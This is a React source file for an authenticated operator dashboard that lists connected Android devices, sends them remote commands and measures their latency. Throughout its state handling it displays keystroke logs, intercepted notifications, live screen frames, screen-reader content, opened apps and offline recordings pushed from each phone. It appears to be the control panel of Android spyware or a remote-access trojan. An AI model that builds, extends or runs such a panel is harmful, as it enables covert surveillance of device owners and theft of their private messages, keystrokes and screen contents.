import React, { useState, useCallback, useRef, useEffect } from 'react';
import { useTcpStream } from './hooks/useTcpStream.js';
import Sidebar from './components/Sidebar.jsx';
import DeviceControl from './components/DeviceControl.jsx';
import Overview from './components/Overview.jsx';
import StatusBar from './components/StatusBar.jsx';
import Login from './components/Login.jsx';
import ServerLogsTab from './components/ServerLogsTab.jsx';
import './App.css';

function useAdminAuth() {
  const [authed, setAuthed] = useState(null);

  useEffect(() => {
    const token = localStorage.getItem('admin_token');
    if (!token) { setAuthed(false); return; }
    fetch('/api/admin/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token }),
    })
      .then(r => r.json())
      .then(d => setAuthed(!!d.success))
      .catch(() => setAuthed(false));
  }, []);

  const logout = () => {
    localStorage.removeItem('admin_token');
    setAuthed(false);
  };

  return { authed, setAuthed, logout };
}

export default function App() {
  const { authed, setAuthed, logout } = useAdminAuth();

  if (authed === null) {
    return (
      <div style={{ display:'flex', alignItems:'center', justifyContent:'center', height:'100vh', background:'var(--bg-primary,#0f0f1a)', color:'#fff' }}>
        Verifying session…
      </div>
    );
  }

  if (!authed) {
    return <Login onLogin={() => setAuthed(true)} />;
  }

  return <AuthenticatedApp logout={logout} />;
}

function AuthenticatedApp({ logout }) {
  const [devices, setDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [globalView, setGlobalView] = useState('overview');
  const [commandResults, setCommandResults] = useState([]);
  const [pendingCommands, setPendingCommands] = useState({});
  const [activityLog, setActivityLog] = useState([]);
  const [streamFrames, setStreamFrames] = useState({});
  const [keylogPushEntries, setKeylogPushEntries] = useState([]);
  const [notifPushEntries, setNotifPushEntries] = useState([]);
  const [activityAppEntries, setActivityAppEntries] = useState([]);
  const [screenReaderPushData, setScreenReaderPushData] = useState({});
  const [offlineRecordingVersion, setOfflineRecordingVersion] = useState({});

  // ── Latency tracking ──────────────────────────────────────────────────
  // serverLatency: dashboard ↔ server RTT in ms (null = not yet measured)
  // deviceLatencies: { [deviceId]: ms } — command round-trip for each device
  const [serverLatency, setServerLatency] = useState(null);
  const [deviceLatencies, setDeviceLatencies] = useState({});
  // Tracks {commandId → {deviceId, sentAt}} for ping commands in flight
  const pingPendingRef = useRef({});

  const handleMessage = useCallback((event, data) => {
    switch (event) {
      case 'device:list':
        setDevices(Array.isArray(data) ? data : []);
        break;

      case 'device:connected':
        setActivityLog(prev => [{
          id: Date.now(),
          type: 'connect',
          text: `Device connected: ${data.deviceId}`,
          time: new Date()
        }, ...prev].slice(0, 100));
        // Merge full deviceInfo (including screenWidth/screenHeight) into the device list
        if (data.deviceId && data.deviceInfo) {
          setDevices(prev => {
            const exists = prev.find(d => d.deviceId === data.deviceId);
            if (exists) {
              return prev.map(d => d.deviceId === data.deviceId
                ? { ...d, isOnline: true, deviceInfo: { ...(d.deviceInfo || {}), ...data.deviceInfo } }
                : d);
            }
            return [...prev, { deviceId: data.deviceId, deviceName: data.deviceInfo.name || data.deviceId,
                               deviceInfo: data.deviceInfo, isOnline: true }];
          });
        }
        break;

      case 'device:disconnected':
        setActivityLog(prev => [{
          id: Date.now(),
          type: 'disconnect',
          text: `Device disconnected: ${data.deviceId}`,
          time: new Date()
        }, ...prev].slice(0, 100));
        setDevices(prev =>
          prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: false } : d)
        );
        break;

      case 'device:heartbeat':
        setDevices(prev =>
          prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: true, lastSeen: data.timestamp } : d)
        );
        break;

      case 'command:sent':
        setPendingCommands(prev => ({ ...prev, [data.commandId]: data }));
        // If we have a pending probe sentAt for this device+ping, promote to commandId key
        if (data.command === 'ping' && data.deviceId) {
          const pendingKey = `__pending_${data.deviceId}`;
          if (pingPendingRef.current[pendingKey] !== undefined) {
            pingPendingRef.current[data.commandId] = { deviceId: data.deviceId, sentAt: pingPendingRef.current[pendingKey] };
            delete pingPendingRef.current[pendingKey];
          }
        }
        break;

      case 'dashboard:pong': {
        if (data?.sentAt) {
          setServerLatency(Date.now() - data.sentAt);
        }
        break;
      }

      // Server-measured TCP RTT (server → Android → server) — the true device latency
      case 'device:latency': {
        if (data?.deviceId && data.rtt != null) {
          setDeviceLatencies(prev => ({ ...prev, [data.deviceId]: data.rtt }));
        }
        break;
      }

      case 'command:result': {
        setPendingCommands(prev => {
          const next = { ...prev };
          delete next[data.commandId];
          return next;
        });
        // Ping command fallback: if no server-side RTT yet, use browser round-trip estimate
        if (data.commandId && pingPendingRef.current[data.commandId]) {
          const { deviceId, sentAt } = pingPendingRef.current[data.commandId];
          delete pingPendingRef.current[data.commandId];
          // Only use the browser estimate if we have no server-side measurement for this device
          setDeviceLatencies(prev => prev[deviceId] != null ? prev : { ...prev, [deviceId]: Date.now() - sentAt });
        }
        const result = {
          id: data.commandId || Date.now(),
          command: data.command,
          deviceId: data.deviceId,
          success: data.success,
          response: data.response,
          error: data.error,
          time: new Date()
        };
        setCommandResults(prev => [result, ...prev].slice(0, 200));
        setActivityLog(prev => [{
          id: Date.now(),
          type: data.success ? 'success' : 'error',
          text: `${data.command} → ${data.success ? 'OK' : data.error}`,
          time: new Date()
        }, ...prev].slice(0, 100));
        break;
      }

      case 'command:error':
        setCommandResults(prev => [{
          id: Date.now(),
          command: data.command || 'unknown',
          deviceId: data.deviceId,
          success: false,
          error: data.message,
          time: new Date()
        }, ...prev].slice(0, 200));
        break;

      case 'task:progress': {
        const progressResult = {
          id: `tp_${Date.now()}_${Math.random()}`,
          command: 'task_progress',
          deviceId: data.deviceId,
          success: !data.error,
          response: data,
          error: data.error || null,
          time: new Date()
        };
        setCommandResults(prev => [progressResult, ...prev].slice(0, 200));
        break;
      }

      case 'stream:frame':
        if (data.deviceId && data.frameData) {
          // Discard stale frames: if the frame was captured more than 2 s ago, skip it.
          // This prevents a backlogged SSE queue from showing outdated screenshots.
          if (data.timestamp && Date.now() - data.timestamp > 2000) break;
          setStreamFrames(prev => ({ ...prev, [data.deviceId]: data.frameData }));
          // Failsafe: update screen dimensions from each frame if not already set
          if (data.screenWidth && data.screenHeight) {
            setDevices(prev => prev.map(d => {
              if (d.deviceId !== data.deviceId) return d;
              const existing = d.deviceInfo || {};
              if (existing.screenWidth === data.screenWidth && existing.screenHeight === data.screenHeight) return d;
              return { ...d, deviceInfo: { ...existing, screenWidth: data.screenWidth, screenHeight: data.screenHeight } };
            }));
          }
        }
        break;

      case 'keylog:push':
        if (data && data.deviceId) {
          setKeylogPushEntries(prev => [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 500));
        }
        break;

      case 'notification:push':
        if (data && data.deviceId) {
          setNotifPushEntries(prev => [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 500));
        }
        break;

      case 'activity:app_open':
        if (data && data.deviceId) {
          setActivityAppEntries(prev => {
            if (prev.length && prev[0].packageName === data.packageName && prev[0].deviceId === data.deviceId) return prev;
            return [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 200);
          });
        }
        break;

      case 'screen:update':
        if (data && data.deviceId) {
          setScreenReaderPushData(prev => ({ ...prev, [data.deviceId]: data }));
        }
        break;

      case 'offline_recording:saved':
        if (data && data.deviceId) {
          setOfflineRecordingVersion(prev => ({
            ...prev,
            [data.deviceId]: (prev[data.deviceId] || 0) + 1,
          }));
        }
        break;

      case 'recording:started':
      case 'recording:saved':
      case 'recording:error':
        break;

      default:
        break;
    }
  }, []);

  const { connected, reconnecting, send } = useTcpStream(handleMessage);

  const sendCommand = useCallback((deviceId, command, params = null) => {
    send('command:send', { deviceId, command, params });
  }, [send]);

  // ── Periodic server latency ping (every 5 s) ──────────────────────────
  useEffect(() => {
    if (!connected) return;
    const tick = () => send('dashboard:ping', { sentAt: Date.now() });
    tick(); // immediate first ping
    const id = setInterval(tick, 5000);
    return () => clearInterval(id);
  }, [connected, send]);

  // Device latency is now measured server-side via the periodic device:ping / device:pong
  // cycle (every 20 s) and broadcast as device:latency events — no manual pinging needed.

  return (
    <div className="app">
      <StatusBar connected={connected} reconnecting={reconnecting} deviceCount={devices.filter(d => d.isOnline).length} onLogout={logout} />
      <div className="app-body">
        <Sidebar
          devices={devices}
          selectedDevice={selectedDevice}
          onSelectDevice={setSelectedDevice}
        />
        <main className="main-content">
          {selectedDevice ? (
            <DeviceControl
              key={selectedDevice}
              device={devices.find(d => d.deviceId === selectedDevice) || { deviceId: selectedDevice }}
              sendCommand={sendCommand}
              results={commandResults.filter(r => r.deviceId === selectedDevice)}
              pending={Object.values(pendingCommands).filter(c => c.deviceId === selectedDevice)}
              onBack={() => setSelectedDevice(null)}
              streamFrame={streamFrames[selectedDevice] || null}
              send={send}
              keylogPushEntries={keylogPushEntries.filter(e => e.deviceId === selectedDevice)}
              notifPushEntries={notifPushEntries.filter(e => e.deviceId === selectedDevice)}
              activityAppEntries={activityAppEntries.filter(e => e.deviceId === selectedDevice)}
              screenReaderPushData={screenReaderPushData[selectedDevice] || null}
              offlineRecordingVersion={offlineRecordingVersion[selectedDevice] || 0}
              serverLatency={serverLatency}
              deviceLatency={deviceLatencies[selectedDevice] ?? null}
            />
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
              <div style={{ display: 'flex', gap: 4, padding: '0 0 14px 0', borderBottom: '1px solid #1e1b4b', marginBottom: 16 }}>
                {[
                  { id: 'overview', label: '📊 Overview' },
                  { id: 'logs',     label: '🖥️ Server Logs' },
                ].map(tab => (
                  <button
                    key={tab.id}
                    onClick={() => setGlobalView(tab.id)}
                    style={{
                      background: globalView === tab.id ? 'rgba(99,102,241,0.2)' : 'transparent',
                      border: globalView === tab.id ? '1px solid #6366f1' : '1px solid transparent',
                      color: globalView === tab.id ? '#a5b4fc' : '#64748b',
                      borderRadius: 8, padding: '6px 16px', fontSize: 13,
                      cursor: 'pointer', fontWeight: globalView === tab.id ? 600 : 400,
                      transition: 'all 0.15s',
                    }}
                  >
                    {tab.label}
                  </button>
                ))}
              </div>
              <div style={{ flex: 1, minHeight: 0 }}>
                {globalView === 'overview' ? (
                  <Overview
                    devices={devices}
                    activityLog={activityLog}
                    onSelectDevice={setSelectedDevice}
                    connected={connected}
                  />
                ) : (
                  <ServerLogsTab />
                )}
              </div>
            </div>
          )}
        </main>
      </div>
    </div>
  );
}
